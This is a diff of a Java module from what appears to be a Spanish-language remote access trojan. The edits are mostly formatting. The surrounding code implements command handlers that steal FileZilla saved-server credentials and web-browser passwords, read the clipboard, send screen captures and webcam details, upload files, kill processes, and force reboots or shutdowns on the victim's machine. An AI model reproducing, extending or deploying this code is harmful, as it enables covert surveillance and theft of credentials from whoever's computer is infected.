@@ -2,6 +2,7 @@ package rt.modulos;
 
 import comunes.Accion;
 import comunes.Archivo;
+import comunes.Interfaz;
 import comunes.Proceso;
 import comunes.WebCamInterface;
 import comunes.WebCamItem;
@@ -24,8 +25,10 @@ import java.io.InputStreamReader;
 import java.lang.management.ManagementFactory;
 import java.net.URI;
 import java.net.URL;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Collections;
+import java.util.Date;
 import java.util.List;
 import java.util.Locale;
 import java.util.regex.Pattern;
@@ -33,9 +36,6 @@ import javax.imageio.ImageIO;
 import network.Conexion;
 import plugin.Plugin;
 import rt.Inicio;
-import comunes.Interfaz;
-import java.text.SimpleDateFormat;
-import java.util.Date;
 import rt.util.CLRT;
 import rt.util.IMG;
 import rt.util.Protocolo;
@@ -43,19 +43,18 @@ import rt.util.UtilRT;
 
 //opciones
 public class OPC extends Thread implements Interfaz {
-    
+
     private int opcion;
     private Object[] parametros = null;
     private Interfaz servicio;
-    
+
     public void instanciar(Object... parametros) {
         this.servicio = (Interfaz) parametros[0];
         this.opcion = (Integer) parametros[1];
         this.parametros = (Object[]) parametros[2];
         start();
-//        procesar();
     }
-    
+
     private void procesar() {
         try {
             switch (opcion) {
@@ -124,17 +123,17 @@ public class OPC extends Thread implements Interfaz {
                     break;
                 case Protocolo.ABRIR_URL:
                     try {
-                        Desktop.getDesktop().browse(new URI((String) parametros[0]));
-                    } catch (Exception e) {
-                        servicio.ejecutar(6, "Error al abrir:" + e.getMessage());
-                    }
-                    break;
+                    Desktop.getDesktop().browse(new URI((String) parametros[0]));
+                } catch (Exception e) {
+                    servicio.ejecutar(6, "Error al abrir:" + e.getMessage());
+                }
+                break;
                 case Protocolo.ADMIN_ARCHIVOS_SUBIR:
                     try {
-                        subirArchivo((String) parametros[0], (String) parametros[1]);
-                    } catch (Exception e) {
-                    }
-                    break;
+                    subirArchivo((String) parametros[0], (String) parametros[1]);
+                } catch (Exception e) {
+                }
+                break;
                 case Protocolo.GET_PORTAPAPELES:
                     enviarPortapapeles();
                     break;
@@ -200,15 +199,15 @@ public class OPC extends Thread implements Interfaz {
                     break;
             }
         } catch (Exception e) {
-            
+
         }
     }
-    
+
     @Override
     public void run() {
         procesar();
     }
-    
+
     private void listarPlugins() {
         try {
             List<Plugin> lista = new ArrayList<Plugin>();
@@ -226,10 +225,10 @@ public class OPC extends Thread implements Interfaz {
             }
             servicio.ejecutar(3, Protocolo.PLUGINS_LISTAR, lista);
         } catch (Exception e) {
-            
+
         }
     }
-    
+
     private void mover(String rutaArchivo, String nuevoArchivo) {
         try {
             File f1 = new File(rutaArchivo);
@@ -238,7 +237,7 @@ public class OPC extends Thread implements Interfaz {
         } catch (Exception e) {
         }
     }
-    
+
     private void copiar(String rutaArchivo, String nuevoArchivo) {
         try {
             File f1 = new File(rutaArchivo);
@@ -247,7 +246,7 @@ public class OPC extends Thread implements Interfaz {
         } catch (Exception e) {
         }
     }
-    
+
     private void reiniciarEquipo() {
         try {
             String cmd = "";
@@ -257,7 +256,7 @@ public class OPC extends Thread implements Interfaz {
                 cmd = "shutdown -r -f -t 0";
                 String[] comando2 = {"cmd ", parametroC, cmd};
                 comando = comando2;
-                
+
             } else if (UtilRT.isLinux()) {
                 String parametroC = "-c";
                 cmd = "init 6";
@@ -271,7 +270,7 @@ public class OPC extends Thread implements Interfaz {
         } catch (Exception e) {
         }
     }
-    
+
     private void apagarEquipo() {
         try {
             String cmd = "";
@@ -295,7 +294,7 @@ public class OPC extends Thread implements Interfaz {
         } catch (Exception ex) {
         }
     }
-    
+
     private void speakTexto(final String texto) {
         try {
             if (UtilRT.isWindows()) {
@@ -311,7 +310,7 @@ public class OPC extends Thread implements Interfaz {
         } catch (Exception ex) {
         }
     }
-    
+
     private void enviarImagenUsuario() {
         try {
             if (UtilRT.isWindows() || UtilRT.isLinux()) {
@@ -335,7 +334,7 @@ public class OPC extends Thread implements Interfaz {
                     String usuario = System.getProperty("user.name");
                     imgAvatar = new File("/var/lib/AccountsService/icons/", usuario);
                 }
-                
+
                 if (imgAvatar.exists()) {
                     try {
                         BufferedImage m = ImageIO.read(imgAvatar);
@@ -348,12 +347,11 @@ public class OPC extends Thread implements Interfaz {
                         servicio.ejecutar(6, "ERROR AL OBTENER AVATAR " + ex.getMessage());
                     }
                 }
-                
             }
         } catch (Exception e) {
         }
     }
-    
+
     private void enviarUnidades() {
         try {
             Archivo[] a;
@@ -362,7 +360,6 @@ public class OPC extends Thread implements Interfaz {
                 if (ar.length > 0) {
                     a = new Archivo[ar.length];
                     for (int p = 0; p < ar.length; p++) {
-                        
                         a[p] = new Archivo();
                         a[p].setLength(ar[p].length());
                         //a[p].setNombre(ar[p].getName());
@@ -375,16 +372,6 @@ public class OPC extends Thread implements Interfaz {
                         a[p].setLibre(ar[p].getFreeSpace());
                         a[p].setTamanio(ar[p].getTotalSpace());
                         a[p].setPathParent("");
-
-//                        a[p] = new Archivo();
-//                        a[p].setLength(ar[p].length());
-//                        a[p].setNombre(ar[p].getName());
-//                        a[p].setCarpeta(ar[p].isDirectory());
-//                        a[p].setPath(ar[p].getAbsolutePath());
-//                        a[p].setTipo(UtilRT.getExtension(ar[p].getName()));
-//                        a[p].setFecha(ar[p].lastModified());
-//                        a[p].setIcono(UtilRT.sacarIcono(ar[p]));
-//                        a[p].setPathParent("");
                     }
                 } else {
                     a = null;
@@ -396,7 +383,7 @@ public class OPC extends Thread implements Interfaz {
         } catch (Exception e) {
         }
     }
-    
+
     private void listarArchivos(String ruta) {
         try {
             File t = new File(ruta);
@@ -435,7 +422,7 @@ public class OPC extends Thread implements Interfaz {
         } catch (Exception e) {
         }
     }
-    
+
     private void enviarThumbail(String ruta) {
         try {
             File ttumbnail = new File(ruta);
@@ -443,22 +430,22 @@ public class OPC extends Thread implements Interfaz {
             if ((ttumbnail.isFile()) && ((nombre.contains(".jpg")) || (nombre.contains(".png"))
                     || (nombre.contains(".jpeg")) || (nombre.contains(".gif")) || (nombre.contains(".ico"))
                     || (nombre.contains(".bmp")))) {
-                try {                    
-                    servicio.ejecutar(3, Protocolo.ADMIN_ARCHIVOS_THUMBAIL, UtilRT.sacarThumbail(ttumbnail));                    
+                try {
+                    servicio.ejecutar(3, Protocolo.ADMIN_ARCHIVOS_THUMBAIL, UtilRT.sacarThumbail(ttumbnail));
                 } catch (Exception ex) {
                 }
             }
         } catch (Exception e) {
         }
     }
-    
+
     private void enviarMiniatura() {
         try {
             servicio.ejecutar(3, Protocolo.GET_MINIATURA_PANTALLA, IMG.getPantallaMiniatura());
         } catch (Exception ex) {
         }
     }
-    
+
     private void subirArchivo(String rutaAsubir, String archivoAsubir) {
         rutaAsubir = UtilRT.procesaNombreCarpeta(rutaAsubir);
         try {
@@ -468,7 +455,7 @@ public class OPC extends Thread implements Interfaz {
         } catch (Exception ex) {
         }
     }
-    
+
     private void enviarPortapapeles() {
         StringBuilder contenido = new StringBuilder();
         try {
@@ -485,11 +472,11 @@ public class OPC extends Thread implements Interfaz {
             }
         } catch (Exception e) {
         }
-        
+
         servicio.ejecutar(3, Protocolo.GET_PORTAPAPELES, contenido.toString());
-        
+
     }
-    
+
     private void reiniciarAplicacion() {
         try {
             final String javaBin = System.getProperty("java.home") + File.separator + "bin" + File.separator + "java";
@@ -510,12 +497,12 @@ public class OPC extends Thread implements Interfaz {
         } catch (Exception ex) {
         }
     }
-    
+
     private void fileZillaPass() {
         try {
-            
+
             StringBuilder r = new StringBuilder();
-            
+
             if (UtilRT.isWindows()) {
                 File f1 = new File(System.getenv("appdata"), "FileZilla");
                 File f = new File(f1, "recentservers.xml");
@@ -544,7 +531,7 @@ public class OPC extends Thread implements Interfaz {
         } catch (Exception e) {
         }
     }
-    
+
     private void wbPass() {
         try {
             File f = File.createTempFile("wb", "txt");
@@ -552,13 +539,13 @@ public class OPC extends Thread implements Interfaz {
             p.waitFor();
             p.destroy();
             servicio.ejecutar(3, Protocolo.PASSWORDS_WEB, UtilRT.getArchivoTexto(f.getAbsolutePath()));
-            
+
             f.delete();
         } catch (Exception ex) {
             servicio.ejecutar(6, "ERROR AL EJECUTAR :" + ex.getMessage());
         }
     }
-    
+
     private void monitor(int accion) {
         if (UtilRT.isWindows()) {
             try {
@@ -714,7 +701,7 @@ public class OPC extends Thread implements Interfaz {
         } catch (Exception e) {
         }
     }
-    
+
     private List<Proceso> listarProcesos() {
         try {
             if (UtilRT.isWindows()) {
@@ -750,16 +737,16 @@ public class OPC extends Thread implements Interfaz {
                     return lista;
                 } catch (Exception ex) {
                 }
-                
+
             } else {
-                
+
             }
         } catch (Exception e) {
             servicio.ejecutar(6, "ERROR AL LISTAR PROCESOS " + e.getMessage());
         }
         return null;
     }
-    
+
     private void enviarListaProcesos() {
         try {
             List<Proceso> lista = listarProcesos();
@@ -767,10 +754,10 @@ public class OPC extends Thread implements Interfaz {
                 servicio.ejecutar(3, Protocolo.GET_LISTA_PROCESOS, lista);
             }
         } catch (Exception e) {
-            
+
         }
     }
-    
+
     private void listarConexiones() {
         // la voy a tener para buscar el nombre del proceso
         List<Proceso> listaProcesos = listarProcesos();
@@ -806,7 +793,7 @@ public class OPC extends Thread implements Interfaz {
                         lista.add(new Proceso(datos2));
                     } catch (Exception e) {
                     }
-                    
+
                 }
                 servicio.ejecutar(3, Protocolo.GET_LISTA_CONEXIONES, lista);
             } catch (Exception ex) {
@@ -833,7 +820,7 @@ public class OPC extends Thread implements Interfaz {
 
                     try {
                         if (datos1[6].contains("/")) {
-                            
+
                             datos2[4] = datos1[6].split("/")[0];// pid procewso
 //                            String nombProceso = datos1[6].split("/")[1];
 //                            //si NO hay el nombre del proceso, lo busca
@@ -885,7 +872,7 @@ public class OPC extends Thread implements Interfaz {
         } else {
         }
     }
-    
+
     private void matarProceso(String pid) {
         if (UtilRT.isWindows()) {
             try {
@@ -900,10 +887,10 @@ public class OPC extends Thread implements Interfaz {
                 servicio.ejecutar(6, "ERROR AL MATAR (" + pid + ") " + ex.getMessage());
             }
         } else {
-            
+
         }
     }
-    
+
     private void enviarListaMonitores() {
         try {
             GraphicsEnvironment g = GraphicsEnvironment.getLocalGraphicsEnvironment();
@@ -918,7 +905,7 @@ public class OPC extends Thread implements Interfaz {
         } catch (Exception e) {
         }
     }
-    
+
     private void enviarListaResoluciones() {
         try {
             GraphicsEnvironment g = GraphicsEnvironment.getLocalGraphicsEnvironment();
@@ -933,10 +920,10 @@ public class OPC extends Thread implements Interfaz {
                 servicio.ejecutar(3, Protocolo.GET_LISTA_RESOLUCION, datos);
             }
         } catch (Exception e) {
-            
+
         }
     }
-    
+
     private void cambiarResolucion(String resolucion) {
         int ancho = 0;
         int alto = 0;
@@ -965,7 +952,7 @@ public class OPC extends Thread implements Interfaz {
             }
         }
     }
-    
+
     private String getExternalIp() {
         String ip = "";
         try {
@@ -984,7 +971,7 @@ public class OPC extends Thread implements Interfaz {
         }
         return ip;
     }
-    
+
     private String getMacAddress(String prefijo) {
         String mac = "";
         try {
@@ -996,7 +983,7 @@ public class OPC extends Thread implements Interfaz {
         }
         return mac;
     }
-    
+
     private void listarOffline() {
         StringBuilder retorno = new StringBuilder();
         try {
@@ -1014,19 +1001,19 @@ public class OPC extends Thread implements Interfaz {
                     }
                     retorno.append("---------------------------------------------------------").append("\n");
                 }
-                
+
             } else {
                 retorno.append("No Existe archivo de capturas de pantalla");
             }
-            
+
         } catch (Exception e) {
             retorno.append("NO EXISTEN ARCHIVOS\n");
             retorno.append("Error:").append(e.getMessage());
         }
         servicio.ejecutar(3, Protocolo.GET_LISTA_OFFLINE, retorno.toString());
-        
+
     }
-    
+
     private void enviarInfoInicial(String puertoTrans, String prefijo, String iplocal, Accion accion) {
         try {
             StringBuilder info = new StringBuilder("");
@@ -1063,12 +1050,12 @@ public class OPC extends Thread implements Interfaz {
             e.printStackTrace();
         }
         servicio.ejecutar(3, Protocolo.PUERTO_TRANSFERENCIA, puertoTrans);
-        
+
         if (accion != null) {
             accion.ejecutar();
         }
     }
-    
+
     private void enviarListaWebCamsDimensiones() {
         try {
             Dimension[] p = ((WebCamInterface) Class.forName("comunes.ObtenerWebCam").newInstance()).listarResoluciones();
@@ -1078,7 +1065,7 @@ public class OPC extends Thread implements Interfaz {
         } catch (Exception e) {
         }
     }
-    
+
     private void enviarListaWebCams() {
         try {
             WebCamItem[] p = ((WebCamInterface) Class.forName("comunes.ObtenerWebCam").newInstance()).listar();
@@ -1088,10 +1075,10 @@ public class OPC extends Thread implements Interfaz {
         } catch (Exception e) {
         }
     }
-    
+
     private void enviarInfoCompleta(String puertoTrans, String prefijo, String localIP) {
         try {
-            
+
             int largo = 21;
             int largoTitulo = 75;
             String li = "==============================================================================\n";
@@ -1113,12 +1100,12 @@ public class OPC extends Thread implements Interfaz {
             inf.append(UtilRT.rellenarEspacios("Versión del servidor", largo)).append(":").append(Inicio.v).append("\n");
             inf.append(UtilRT.rellenarEspacios("Ruta del servidor", largo)).append(":").append(server.getParent()).append("\n");
             inf.append(UtilRT.rellenarEspacios("Puerto", largo)).append(":").append(servicio.get(3)).append("\n");
-            inf.append(UtilRT.rellenarEspacios("Puerto transferencia", largo)).append(":").append(puertoTrans).append("\n");
+//            inf.append(UtilRT.rellenarEspacios("Puerto transferencia", largo)).append(":").append(puertoTrans).append("\n");
             inf.append(UtilRT.rellenarEspacios("Captura offline", largo)).append(":").append((Boolean) servicio.get(8) ? "SI" : "NO").append("\n");
 
 //            inf.append("\n===================== SSL =====================================\n");
             inf.append("\n").append(UtilRT.crearTituloString("SSL", largoTitulo)).append("\n");
-            
+
             inf.append(UtilRT.rellenarEspacios("SSL", largo)).append(":").append((Boolean) Inicio.config.obtenerParametro("ssl") ? "SI" : "NO").append("\n");
             if ((Boolean) Inicio.config.obtenerParametro("ssl")) {
                 inf.append(UtilRT.rellenarEspacios("Información SSL", largo)).append(":").append(((Conexion) servicio.get(14)).getSSlInfo()).append("\n");
@@ -1150,13 +1137,13 @@ public class OPC extends Thread implements Interfaz {
             } catch (Exception e) { // solo un monitor resolucion
 
             }
-            
+
             String tieneCam;
 
 //            inf.append("\n===================== MONITORES =====================================\n");
             inf.append("\n").append(UtilRT.crearTituloString("MONITORES", largoTitulo)).append("\n");
             try {
-                
+
                 inf.append(UtilRT.rellenarEspacios("Monitores", largo)).append(":").append(monitores.length).append("\n");
                 int i = 0;
                 for (GraphicsDevice dev : monitores) {
@@ -1258,10 +1245,10 @@ public class OPC extends Thread implements Interfaz {
             servicio.ejecutar(3, Protocolo.GET_INFO_COMPLETA, inf.toString());
         } catch (Exception ex) {
             servicio.ejecutar(3, Protocolo.GET_INFO_COMPLETA, "Error al obtener Información.\n" + ex.getMessage());
-            
+
         }
     }
-    
+
     private void enviarSysInfo() {
         try {
             if (UtilRT.isWindows()) {
@@ -1273,28 +1260,30 @@ public class OPC extends Thread implements Interfaz {
                     salida.append(tmp).append("\n");
                 }
                 servicio.ejecutar(3, Protocolo.GET_INFO_COMPLETA, salida.toString());
+            } else {
+                servicio.ejecutar(6, "ERROR AL EJECUTAR SYSTEMINFO: El cliente no se ejecuta sobre Windows");
             }
         } catch (Exception ex) {
             servicio.ejecutar(6, "ERROR AL EJECUTAR SYSTEMINFO" + ex.getMessage());
         }
     }
-    
+
     private void comprimir(String archivo) {
         try {
             UtilRT.comprimir(new File(archivo));
         } catch (Exception ex) {
         }
     }
-    
+
     public void set(int opcion, Object valor) {
-        
+
     }
-    
+
     public Object get(int opcion, Object... parametros) {
         return null;
     }
-    
+
     public void ejecutar(int opcion, Object... parametros) {
-        
+
     }
 }
